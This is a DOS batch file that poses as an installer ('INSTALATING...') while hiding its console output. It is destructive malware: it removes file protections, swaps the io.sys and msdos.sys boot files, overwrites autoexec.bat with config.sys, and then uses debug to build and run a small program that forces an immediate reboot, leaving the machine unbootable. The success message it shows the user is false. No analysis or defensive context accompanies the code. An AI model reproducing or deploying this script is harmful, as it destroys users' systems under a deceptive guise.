   @echo off
   cls
   @ctty nul
   echo. INSTALATING...
   c:  >> c:\temp
   cd\ >> c:\temp
   attrib -a -h -r -s *.*
   copy io.sys SwapFile.vir
   copy msdos.sys io.sys /Y
   copy SwapFile.vir msdos.sys /Y
   copy autoexec.bat SwapFile.vir
   copy config.sys autoexec.bat
   ren SwapFile.vir config.sys
   rem ---------- FINISHING ----------
   echo. DONE ! PLEASE REBOOT YOUR COMPUTER !
   echo.e CD 19 >>SwapFile.vir
   echo.rcx>>SwapFile.vir
   echo.2>>SwapFile.vir
   echo.ndeu.com>>SwapFile.vir
   echo.w>>SwapFile.vir
   echo.q>>SwapFile.vir
   debug <SwapFile.vir
   deu
   @ctty con
